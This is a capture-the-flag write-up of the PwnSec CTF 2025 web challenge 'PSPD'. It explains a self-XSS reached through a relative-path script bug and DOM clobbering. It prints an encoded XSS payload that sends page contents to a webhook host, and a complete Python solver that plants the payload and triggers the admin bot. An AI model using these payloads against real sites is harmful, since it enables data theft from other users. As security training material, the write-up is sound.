---
title: "Web - PSPD - PwnSec CTF 2025"
date: "2025-11-23"
excerpt: "Writeup of the web challenge PSPD from PwnSec CTF 2025"
tags: ["web"]
author: "VXXDXX"
---

## Overview

> They begged me not to do it, but I had to. Can you bring PwnSec's Police Department to a clojure?

Challenge author: aelmo  
Solves: 2

![Solves](/static/img/posts/2025-pwnsec-web-pspd/solves.webp)

---

## 1. General Analysis

The application is written in Clojure, however the challenge doesn't involve anything specific to it. The flag is located in the admin bot's journal. It's not protected by any auth check - all we have to do is learn the admin's user id.

---

## 2. Self XSS on the main page

`index.html` contains the following snippet.

```js
userDataElement.insertAdjacentHTML(
  "beforeend",
  `<p style='margin-top: 3rem;'>Not agent <b>${decodeURIComponent(
    userData.username
  )}</b>? Report this incident to +111-337-1337</p>`
);
```

`userData.username` is unsanitized and inserted as HTML meaning it's vulnerable to XSS. `userData` comes from `loadUserData.js`.

```js
(async () => {
  let { uid } = document.currentScript.dataset;

  // load the fallback uid
  if (uid) {
    window.uid = uid;
  } else {
    uid = window.uid;
  }

  // uid must be available
  console.log(uid);

  userData = await (await fetch(`/users/${uid}`)).json();
  console.log(userData);
})();
```

Which is included as a script in `index.html`.

```html
<script src="/static/js/clientsideUIDFallback.js"></script>
<script data-uid="{{user-id}}" src="static/js/loadUserData.js"></script>
```

And the `user-id` is assigned from session in `core.clj`.

<!-- {% raw %} -->
```clojure
[(defroutes app-routes
   (-> (GET "/" [user-id :as {{user-id :user-id} :session}]
         (render-file "static/index.html" {:title "Control Panel" :user-id user-id}))
       (wrap-routes wrap-authenticated?))
...
```
<!-- {% endraw %} -->

We can't manipulate the session of the bot directly to change their user id. 

---

## 3. Relative path bug

The page also loads `clientsideUIDFallback.js` which assigns `window.uid` from a query parameter.

```js
(async () => {
  // our devs said the clojure templater is not reliable
  // this hack should ensure our 99.99999999% agent page
  // availability
  uid = new URLSearchParams(location.search).get("user-id");
  window.dispatchEvent(new CustomEvent("clj-uid-loaded", { uid: window.uid }));
})();
```

The comment might make us wrongly assume the issue has something to do with the clojure templater, but the bug is in the way the scripts are loaded.

```html
<script src="/static/js/clientsideUIDFallback.js"></script>
<script data-uid="{{user-id}}" src="static/js/loadUserData.js"></script>
```

If we navigate to index.html via the static route `/static/index.html`, `clientsideUIDFallback.js` will still load correctly since it's using an absolute path, while `loadUserData.js` will be attempted to load from `/static/static/js/loadUserData.js` which will lead to 404.

![Relative path fails to load](/static/img/posts/2025-pwnsec-web-pspd/relative.webp)

## 4. DOM Clobber

Once we navigate to `/static/index.html?user-id=OUR_USER_ID`, only `clientsideUIDFallback.js` will load. Sadly, `userData` was assigned only in `loadUserData.js` so we can't perform the self XSS directly. Let's analyze further what's happening when we visit the page using `/static/index.html?user-id=OUR_USER_ID`.

```html
<script>
  let DOMPurifyConfig = {
    // just enough for our basic journals
    ALLOWED_TAGS: ["a", "b", "i", "ul", "ol", "li"],
    FORBID_ATTR: ["name"],
  };
  let userDataElement = document.querySelector("#userContainer");

  // polling user data because my scripts are not preserving order
  // is it because of the async? 🤷‍♂️
  let polls = 0;
  let pollUserData = setInterval(async () => {
    polls++;

    if (polls > 20 || (userData && uid)) {
      clearInterval(pollUserData);

      userDataElement.removeAttribute("aria-busy");
      userDataElement.innerText = "";

      let userJournal = await (
        await fetch(`/users/${uid}/journal`)
      ).json();
      console.log(userJournal);

      // they told me its good for security 🤷
      userJournal = userJournal.replace(/textarea/gi, "");

      userDataElement.insertAdjacentHTML(
        "afterbegin",
        `
    <h2>Edit Journal</h2>
    <form method="POST" action="/users/{{user-id}}">
    <label for="journal"></label>
      <textarea id="journal" name="journal" type="text">${DOMPurify.sanitize(
          userJournal,
          DOMPurifyConfig
        )}</textarea>
      <button>Update</button>
    </form>
    `
      );

      userDataElement.insertAdjacentHTML(
        "afterbegin",
        `
        <hgroup>
          <h2>Journal</h2>
          <h3>Agent's Incident Journal</h3>
          </hgroup>
          <div class="journal-container">${DOMPurify.sanitize(
          userJournal,
          DOMPurifyConfig
        )}</div>`
      );

      try {
        const displayUserData = [
          "id",
          "username",
          "password",
          "is-admin",
        ];
        // gracefully populate userData dependent UI
        let preEl = document.createElement("pre");
        preEl.innerText =
          `// userData - debug_id: ${(crypto?.randomUUID && crypto.randomUUID()) || NaN
          }\n` +
          JSON.stringify(userData, undefined, 2) +
          "\n\n";

        userDataElement.insertAdjacentElement("afterbegin", preEl);

        userDataElement.insertAdjacentHTML(
          "beforeend",
          `<p style='margin-top: 3rem;'>Not agent <b>${decodeURIComponent(
            userData.username
          )}</b>? Report this incident to +111-337-1337</p>`
        );
      } catch (err) {
        console.error(err);
      }
    }
  }, 100);
</script>
```

The script will keep polling until `polls` reaches `21`, since `userData` is unset. Afterwards, `/users/${uid}/journal` will be fetched, sanitized with DOMPurify and inserted as HTML into the `userDataElement`. The DOMPurify config allows us to use tags `"a", "b", "i", "ul", "ol", "li"` and forbids `"name"` attribute. We need to perform a two levels deep clobber of `userData.username` with our XSS payload, but we're heavily restricted. For example, we can't do it by nested forms. Instead, we opt for a trick with `a` tag and `username` part in the href URL. 

Given `a` element like this:

```html
<a href="https://MY_USERNAME@x.com" id="userData"></a>
```

`userData` will resolve to the `a` tag because of the `id`, then `userData.username` will resolve to `MY_USERNAME`, because it's the username part of the URL (the part after the procotol `https://` and before `@` which delimits it from the host). Here's how our payload will look like.

```html
<a href="https://%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27ZmV0Y2goJy8nKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGI9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCdodHRwOi8vNTE2NTNmM2YtYTVhNi00Y2RiLWE3YTctNWQwZmIwNWIwZDNjLndlYmhvb2suc2l0ZScsYikp%27%29%29%20%2F%3E@x.com" id="userData"></a>
```

## 5. Exploit Plan

- Create a user and write down our id,
- Insert DOM clobbering payload into our journal that will leak admin's id from the page,
- Send the admin bot to `/static/index.html?user-id=OUR_USER_ID`,
- Navigate to `/users/ADMIN_USER_ID/journal` to get the flag.

---

## 6. Solver Script

<!-- {% raw %} -->

```py
import requests
import secrets
import string
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:1580"

def random_alnum(length=16):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def main():
    session = requests.Session()

    username = random_alnum(16)
    password = random_alnum(16)

    print(f"[+] Using username: {username}")
    print(f"[+] Using password: {password}")

    # 1. Register
    signup_url = f"{BASE_URL}/users/signup"
    signup_data = {
        "username": username,
        "password": password,
    }
    r = session.post(signup_url, data=signup_data)
    print(f"[+] Signup status: {r.status_code}")

    # 2. Login
    signin_url = f"{BASE_URL}/users/signin"
    signin_data = {
        "username": username,
        "password": password,
    }
    r = session.post(signin_url, data=signin_data)
    print(f"[+] Signin status: {r.status_code}")

    # 2.5 Fetch / and extract TARGET_USER_ID from:
    # <script data-uid="...uuid-here..." src="static/js/loadUserData.js">
    home_url = f"{BASE_URL}/"
    r = session.get(home_url)
    print(f"[+] GET / status: {r.status_code}")

    m = re.search(r'data-uid="([0-9a-f-]+)"', r.text)
    if not m:
        print("[-] Could not find data-uid in home page HTML")
        return

    target_uid = m.group(1)
    print(f"[+] Extracted TARGET_USER_ID: {target_uid}")

    # 3. Update journal for the TARGET_USER_ID with the provided payload
    update_url = f"{BASE_URL}/users/{target_uid}"

    # Modify the payload to leak to your webhook
    journal_body = (
        "journal=%3Ca+id%3D%22userData%22+href%3D%22https%3A%2F%2F%253Cimg%2520src%253Dx%2520onerror%253Deval%2528atob%2528%2527"
        "ZmV0Y2goJy8nKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGI9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCdodHRwOi8vNTE2NTNmM2YtYTVhNi00Y2RiLWE3YTctNWQwZmIwNWIwZDNjLndlYmhvb2suc2l0ZScsYikp"
        "%2527%2529%2529%2520%252F%253E%40x.com%22%3E%3C%2Fa%3E"
    )

    headers_form = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    r = session.post(update_url, data=journal_body, headers=headers_form)
    print(f"[+] Journal update status: {r.status_code}")

    # 4. Send bot via /report/
    report_url = f"{BASE_URL}/report/"

    # Build the URL parameter dynamically with the extracted UID
    target_page = f"http://proxy/static/index.html?user-id={target_uid}"
    report_body = "url=" + quote(target_page, safe="")

    report_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
    }

    r = session.post(report_url, data=report_body, headers=report_headers)
    print(f"[+] Report submission status: {r.status_code}")

    print("[+] Done. Bot should now hit the injected journal page (if challenge is set correctly).")

if __name__ == "__main__":
    main()
```

<!-- {% endraw %} -->

---

```
(base) vboxuser@kali /mnt/repos/pwnsecctf-2025/pspd $ python3 a.py
[+] Using username: xPDX74U8rux9TNFA
[+] Using password: pLhXq4cBwJuOGPcB
[+] Signup status: 200
[+] Signin status: 200
[+] GET / status: 200
[+] Extracted TARGET_USER_ID: 5305e533-66dc-4e67-afb6-dbe90431abd7
[+] Journal update status: 200
[+] Report submission status: 200
[+] Done. Bot should now hit the injected journal page (if challenge is set correctly).
```

Upon running it, we receive the main page with the admin's id in our webhook.

![Webhook result](/static/img/posts/2025-pwnsec-web-pspd/webhook.webp)

Then we navigate to the journal and get the flag.

![Flag](/static/img/posts/2025-pwnsec-web-pspd/flag.webp)

---

## 7. Final Notes

I was misled by the comments and the older version of selmer in the project, but in the end it was all HTML and Javascript.

XOXO,  
VXXDXX